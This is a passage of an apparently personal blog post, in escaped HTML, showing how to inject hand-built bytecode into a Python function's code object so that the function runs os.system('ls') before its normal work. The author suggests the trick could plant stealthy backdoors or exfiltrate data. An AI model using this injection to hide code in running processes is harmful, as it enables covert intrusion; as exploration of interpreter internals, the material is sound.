&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_code    : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;l&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa0\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa1\x01\x01\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x17\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Source Line  m  operation&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;byte&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;code      operand (useful name&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;number)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;---------------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; IMPORT_NAME              &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (os)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; STORE_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; (os)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; (os)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; LOAD_METHOD              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (system)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; CALL_METHOD              &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; POP_TOP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (x)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (y)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; BINARY_ADD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We notice that the bytecode changed significantly, which was expected. Firstly, we notice that we need to change
the all 3 variable tuples (co_varnames, co_names, co_consts):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt;]: injvnames &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;44&lt;/span&gt;]: injnames &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt;]: injconsts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt;]: add_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add_code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_varnames&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;injvnames)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;]: add_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add_code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_names&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;injnames)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;]: add_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add_code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_consts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;injconsts)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_varnames: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_names   : (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_consts  : (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;whoami&amp;#39;&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;That was pretty easy, now let&amp;rsquo;s go and construct out injected bytecode and insert it before the function&amp;rsquo;s bytecode&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# inj_code = (&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x64&amp;#34;,  LOAD_CONST    (0)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x01&amp;#34;,  1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x64&amp;#34;,  LOAD_CONST    (None)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x00&amp;#34;,  0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x6c&amp;#34;,  IMPORT_NAME   (os)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x00&amp;#34;,  0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x7d&amp;#34;,  STORE_FAST    (os)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x02&amp;#34;,  2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x7c&amp;#34;,  LOAD_FAST     (os)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x02&amp;#34;,  2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\xa0&amp;#34;,  LOAD_METHOD   (system)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x01&amp;#34;,  1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x64&amp;#34;,  LOAD_CONST    (ls)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x02&amp;#34;,  2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\xa1&amp;#34;,  CALL_METHOD&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x01&amp;#34;,  1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x01&amp;#34;,  POP_TOP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#         &amp;#34;\x00&amp;#34;,  POP_TOP&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# )&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt;]: inj_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x64\x01\x64\x00\x6c\x00\x7d\x02\x7c\x02\xa0\x01\x64\x02\xa1\x01\x01\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt;]: print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;inj_code : &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes(inj_code)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt;]: print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;add_code : &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes(add&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;]: print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;result   : &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;bytes(inj_code &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; add&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;inj_code : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;l&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa0\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa1\x01\x01\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add_code : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x14\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result   : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;l&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa0\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x02\xa1\x01\x01\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x14\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All that&amp;rsquo;s left to do is to change the &lt;code&gt;co_code&lt;/code&gt; attribute and execute the function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt;]: add_code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add_code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_code&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;inj_code &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; add_code&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt;]: add&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add_code
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;]: add(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;disas&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  inject&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  main_func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  naked&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py  notes  __pycache__
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Victory !! We achieved code execution.&lt;/p&gt;
&lt;p&gt;You can imagine how you could use this as a stealthy way to deploy stealthy backdoors, exfiltrate data, etc.
The nice thing about this aproach is that your code gets executed by the current running process, without spawning a suspicios subprocess that may raise some alerts. I haven&amp;rsquo;t tested this yet, but I think that this kind of attack
might be more effective if a deserialization vulnerability is in place.&lt;/p&gt;
&lt;p&gt;There are some things to note though:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;This example uses a simple add function. Hence, the interaction with different attributes are minimal &lt;em&gt;(e.g co_names was empty in our example)&lt;/em&gt;. Since there weren&amp;rsquo;t many interactions with some of the variable tuples, we could easily add our own and easily change the bytecode to load from those specific indexe&amp;rsquo;s
&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;More complex functions might be harder to inject because you need to set the position of your injected variables in such a way that is compatible with the bytecode already in place. Consequently, it might not be as easy as inserting your injected code at the start, instead you will also need to modify some of the original bytecode instructions accordingly.
&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;Another thing that I noticed during my explorations is that function parameters play a big role in choosing how you position your injected variables.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Currently, I&amp;rsquo;m trying to develop a way to automatically inject any piece of bytecode in any function. However, I
ran into some problems due to the points I made above. So if there are some python guru&amp;rsquo;s reading this, please
reach out to me at &lt;code&gt;vlaghew@protonmail.com&lt;/code&gt; and we might develop something beautiful. Thanks !&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Since I just realized that this article got pretty lengthy I will stop here even if I wanted to aproach some other subjects such as: digging into the CPython Virtual Machine, Building an interpreter, etc. However, I might do that in separate articles. Until then, make sure to check out the awesome resources below which made the creation of this post possible and enlightened me about the unknown world of python vm. There are some great reads made by amazing people who share their knowledge, craft and experience.&lt;/p&gt;
&lt;p&gt;As a final note, I encourage you to go and play around with the new tricks you&amp;rsquo;ve learned and maybe you&amp;rsquo;ll find something interesting that can be used in your advantage. Learn by doing and don&amp;rsquo;t forget to have fun !&lt;/p&gt;
&lt;p&gt;Vlaghe out.&lt;/p&gt;
&lt;h2 id=&#34;resources&#34;&gt;Resources&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://ruslanspivak.com/lsbasi-part1/&#34;&gt;https://ruslanspivak.com/lsbasi-part1/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.bravegnu.org/blog/python-byte-code-hacks.html&#34;&gt;http://www.bravegnu.org/blog/python-byte-code-hacks.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://0xec.blogspot.com/2017/03/hacking-cpython-virtual-machine-to.html&#34;&gt;https://0xec.blogspot.com/2017/03/hacking-cpython-virtual-machine-to.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/&#34;&gt;https://tenthousandmeters.com/blog/python-behind-the-scenes-4-how-python-bytecode-is-executed/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/&#34;&gt;https://tenthousandmeters.com/blog/python-behind-the-scenes-1-how-the-cpython-vm-works/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/python/cpython&#34;&gt;https://github.com/python/cpython&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.ics.uci.edu/~brgallar/week9_3.html&#34;&gt;https://www.ics.uci.edu/~brgallar/week9_3.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://files.eric.ed.gov/fulltext/EJ1164711.pdf&#34;&gt;https://files.eric.ed.gov/fulltext/EJ1164711.pdf&lt;/a&gt;&lt;/li&gt;
